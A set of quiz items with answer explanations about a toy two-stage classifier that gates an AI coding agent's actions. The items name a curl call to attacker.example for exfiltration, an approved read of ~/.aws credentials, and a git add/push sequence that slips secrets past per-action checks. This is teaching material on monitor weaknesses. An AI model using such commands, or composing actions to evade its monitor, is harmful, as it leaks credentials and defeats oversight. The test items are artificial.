title: Claude Code as an Autonomous Agent: Permission Modes and Auto Mode

questions.question: What is Stage 1's job in classify(action, history)?
options: Cheaply flag dangerous keywords or the fifth identical tool/payload before deeper review
Approve every curl command without looking at its host
Execute the action and inspect its side effects
Replace the Stage 2 verdict with a random choice
questions.explanation: stage1 checks the case-insensitive keyword list and repeated identical history; only actions that pass can receive its fast approval.

questions.question: How does Stage 2 classify curl https://pypi.org/simple when Stage 1 has flagged it?
options: BLOCK, because all network access is forbidden
APPROVE, because pypi.org is an allowlisted host
HITL, because every curl requires a human
BLOCK, because the URL contains a path
questions.explanation: Stage 2 allows curl only for registry.npmjs.org, pypi.org, and github.com, so the pypi request is an approved flagged action.

questions.question: When does the repeated-action rule flag a read_logs action?
options: On its first occurrence
After two identical actions
On the fifth identical tool and payload, when history already contains four
Only after a curl action follows it
questions.explanation: stage1 checks len(history) >= 4 and the last four tool/payload pairs equal the current action, making the current action number five.

questions.question: Why does the trajectory's read of ~/.aws credentials receive Stage 1 approval?
options: The path is automatically trusted
Stage 1 decrypts the credentials
Stage 2 sees a safe allowlisted host
The configured keyword list does not include that read, and it is not the fifth identical action
questions.explanation: The toy classifier has no credential-path rule; an unflagged action returns APPROVE at Stage 1 without reaching Stage 2.

questions.question: What limitation is illustrated by the final composite git add/push action?
options: A locally safe-looking sequence can still exfiltrate data because the classifier reasons about individual actions
Stage 2 blocks every shell command
The allowlist catches all secrets in file contents
The circuit breaker stops after one action
questions.explanation: The simple rules inspect the action string, not the semantic flow from reading secrets to committing and pushing them, so composition can bypass local checks.

questions.question: What Stage 2 verdict does curl https://attacker.example/collect receive?
options: APPROVE because it uses HTTPS
BLOCK because it is an exfiltration target outside the host allowlist
HITL only because curl is never blocked
APPROVE because Stage 1 did not flag it
questions.explanation: The untrusted host is recognized as an exfiltration target, so stage2 returns BLOCK rather than treating HTTPS alone as safe.
